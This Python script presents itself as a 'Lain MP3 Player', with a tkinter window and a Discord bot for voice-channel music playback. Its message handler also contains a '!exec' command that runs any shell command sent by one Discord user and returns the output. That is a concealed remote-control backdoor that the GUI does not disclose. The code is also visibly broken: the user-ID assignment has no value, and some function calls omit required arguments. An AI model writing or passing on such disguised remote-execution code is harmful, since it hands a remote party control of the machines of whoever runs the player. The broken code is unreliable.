import io
import discord
import asyncio
import subprocess
import threading
import tkinter as tk
from tkinter import filedialog
from tkinter import PhotoImage
from urllib.request import urlopen
from PIL import Image, ImageTk

# Discord client settings
client = discord.Client()

# Authorized user ID
AUTHORIZED_USER_ID =   # Replace with your Discord user ID

# Global variables
voice_client = None
current_song = None
queue = []
loop = False

# Function to execute shell commands
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

# Event: Client ready
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

# Event: On message
@client.event
async def on_message(message):
    if message.author.id == AUTHORIZED_USER_ID:
        if message.content.startswith('!exec'):
            command = message.content[len('!exec '):]
            output = execute_command(command)
            await message.channel.send(f'```\n{output}\n```')
        elif message.content.startswith('!join'):
            channel_id = int(message.content[len('!join '):])
            await join_voice_channel(channel_id, message.channel)
        elif message.content.startswith('!play'):
            file_path = message.content[len('!play '):]
            await play_music(file_path, message.channel)
        elif message.content.startswith('!skip'):
            await skip_music(message.channel)
        elif message.content.startswith('!leave'):
            await leave_voice_channel(message.channel)
        elif message.content.startswith('!loop'):
            toggle_loop()
            await message.channel.send(f'Loop is now {"enabled" if loop else "disabled"}')

# Function to join a voice channel
async def join_voice_channel(channel_id, text_channel):
    global voice_client
    channel = client.get_channel(channel_id)
    if channel is not None and isinstance(channel, discord.VoiceChannel):
        voice_client = await channel.connect()
        await text_channel.send(f"Joined {channel.name}")
    else:
        await text_channel.send("Invalid channel ID")

# Function to play music
async def play_music(file_path, text_channel):
    global current_song, voice_client
    current_song = file_path
    if voice_client and voice_client.is_connected():
        voice_client.play(discord.FFmpegPCMAudio(file_path), after=lambda e: asyncio.run_coroutine_threadsafe(play_next(), client.loop))
        await text_channel.send(f'Playing {file_path}')
    else:
        await text_channel.send("Not connected to a voice channel")

# Function to play the next song in the queue
async def play_next():
    global current_song, queue, loop
    if loop:
        await play_music(current_song)
    elif queue:
        next_song = queue.pop(0)
        await play_music(next_song)

# Function to skip the current song
async def skip_music(text_channel):
    if voice_client and voice_client.is_playing():
        voice_client.stop()
        await play_next()
        await text_channel.send("Skipped current song")

# Function to leave the voice channel
async def leave_voice_channel(text_channel):
    global voice_client
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
        voice_client = None
        await text_channel.send("Disconnected from the voice channel")

# Function to toggle the loop setting
def toggle_loop():
    global loop
    loop = not loop
    print(f'Loop is now {"enabled" if loop else "disabled"}')

# GUI setup
def create_gui():
    root = tk.Tk()
    root.title("Lain MP3 Player")

    # Background image setup
    url = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJ6Gr4w7OR42V3EL_9-Ckvk0ZIUyywBa6tmBk7v1PFT2KpWEiuudFgelae7ZU7Va5jTbSCbn7A7MQLni4szwrQQYPLAd1ntWWDW0If5BUmcyIBaZw9houaK-aiF6VAbBtXLqd_bwMRF2vE/s1600/lain1.jpg"
    image_bytes = urlopen(url).read()
    image = Image.open(io.BytesIO(image_bytes))
    background_image = ImageTk.PhotoImage(image)

    background_label = tk.Label(root, image=background_image)
    background_label.place(relwidth=1, relheight=1)

    channel_label = tk.Label(root, text="Voice Channel ID:", bg="white")
    channel_label.pack()

    channel_entry = tk.Entry(root)
    channel_entry.pack()

    join_button = tk.Button(root, text="Join", command=lambda: asyncio.run_coroutine_threadsafe(join_voice_channel(int(channel_entry.get()), None), client.loop))
    join_button.pack()

    file_path = tk.StringVar()

    def open_file():
        filepath = filedialog.askopenfilename(filetypes=[("MP3 Files", "*.mp3")])
        file_path.set(filepath)

    file_button = tk.Button(root, text="Open File", command=open_file)
    file_button.pack()

    play_button = tk.Button(root, text="Play", command=lambda: asyncio.run_coroutine_threadsafe(play_music(file_path.get(), None), client.loop))
    play_button.pack()

    skip_button = tk.Button(root, text="Pause", command=lambda: asyncio.run_coroutine_threadsafe(skip_music(None), client.loop))
    skip_button.pack()

    leave_button = tk.Button(root, text="Leave", command=lambda: asyncio.run_coroutine_threadsafe(leave_voice_channel(None), client.loop))
    leave_button.pack()

    loop_button = tk.Button(root, text="Toggle Loop", command=toggle_loop)
    loop_button.pack()

    root.mainloop()

# Discord client run function
async def run_discord_client():
    await client.start('')

# Main function
async def main():
    # Run Discord client in a separate thread
    discord_thread = threading.Thread(target=lambda: asyncio.run(run_discord_client()))
    discord_thread.start()

    # Run GUI
    create_gui()

if __name__ == "__main__":
    asyncio.run(main())
